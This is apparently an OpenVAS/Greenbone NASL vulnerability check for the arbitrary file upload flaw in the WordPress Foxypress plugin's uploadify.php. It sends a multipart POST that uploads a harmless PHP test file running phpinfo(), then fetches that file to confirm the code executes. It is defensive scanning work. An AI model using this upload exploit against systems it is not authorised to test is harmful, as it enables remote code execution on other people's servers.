# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802638");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-11 12:12:12 +0530 (Mon, 11 Jun 2012)");
  script_name("WordPress Foxypress Plugin 'uploadify.php' Arbitrary File Upload Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49382");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53805");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18991");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/foxypress/changelog/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113283/wpfoxypress-shell.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to upload arbitrary PHP code
  and run it in the context of the Web server process.");
  script_tag(name:"affected", value:"WordPress Foxypress Plugin version 0.4.2.1");
  script_tag(name:"insight", value:"The flaw is due to the wp-content/plugins/foxypress/uploadify/
  uploadify.php script allowing to upload files with arbitrary extensions to
  a folder inside the webroot. This can be exploited to execute arbitrary PHP
  code by uploading a malicious PHP script.");
  script_tag(name:"solution", value:"Update to WordPress Foxypress Plugin version 0.4.2.2 or later.");
  script_tag(name:"summary", value:"WordPress Foxypress Plugin is prone to file upload vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/foxypress/uploadify/uploadify.php";
file = "ov-file-upload-test.php";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

rand = rand();
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex) + 220;
req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", host, "\r\n",
      "User-Agent: ", useragent, "\r\n",
      "Content-Type: multipart/form-data; boundary=---------------------------5626d00351af\r\n",
      "Content-Length: ", len, "\r\n\r\n",
      "-----------------------------5626d00351af\r\n",
      'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      ex,"\r\n",
      "-----------------------------5626d00351af--\r\n\r\n");
res = http_keepalive_send_recv(port: port, data: req);

if(res && res =~ "^HTTP/1\.[01] 200") {

  path = eregmatch(pattern: 'file_path":".*(/wp-content[^"]+)', string: res);
  if(!path[1])
    exit(0);

  path = ereg_replace(pattern: "\\", string: path[1], replace: "");
  if(!path)
    exit(0);

  url = string(dir, path);

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<title>phpinfo\(\)", extra_check:rand)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
